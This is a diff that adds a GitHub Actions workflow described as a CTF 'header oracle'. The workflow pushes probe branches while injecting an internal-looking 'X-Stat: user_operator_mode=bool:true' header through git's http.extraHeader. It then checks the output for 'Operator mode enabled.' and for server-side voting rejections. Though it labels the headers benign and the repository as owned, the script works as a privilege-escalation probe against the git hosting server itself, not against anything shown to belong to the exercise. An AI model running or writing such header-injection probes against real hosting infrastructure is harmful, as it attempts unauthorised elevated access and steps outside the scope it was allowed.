@@ -1,0 +1,61 @@
+name: X-Stat external HTTP header oracle
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/xstat-http-header-oracle.yml
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Check out the owned CTF repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Compare benign external X-Stat headers
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          run_push() {
+            local label="$1"
+            local header_value="$2"
+            local probe_ref="refs/heads/oracle/http-xstat-${label}-${GITHUB_RUN_ID}"
+            local -a config_args=()
+
+            if [[ -n "$header_value" ]]; then
+              config_args=(-c "http.extraHeader=$header_value")
+            fi
+
+            set +e
+            git "${config_args[@]}" push origin "HEAD:${probe_ref}" 2>&1 |
+              tee "${label}-output.txt"
+            local rc=${PIPESTATUS[0]}
+            set -e
+
+            echo "ORACLE_${label^^}_RC=${rc}"
+            if grep -Fq 'Operator mode enabled.' "${label}-output.txt"; then
+              echo "ORACLE_${label^^}_OPERATOR_OUTPUT=1"
+            else
+              echo "ORACLE_${label^^}_OPERATOR_OUTPUT=0"
+            fi
+            if grep -Fq 'no voting servers succeeded' "${label}-output.txt"; then
+              echo "ORACLE_${label^^}_VOTING_REJECTION=1"
+            else
+              echo "ORACLE_${label^^}_VOTING_REJECTION=0"
+            fi
+          }
+
+          run_push control ''
+          run_push operator_true 'X-Stat: user_operator_mode=bool:true'
+          run_push operator_false 'X-Stat: user_operator_mode=bool:false'
+          run_push unknown_field 'X-Stat: ctf_probe=bool:true'
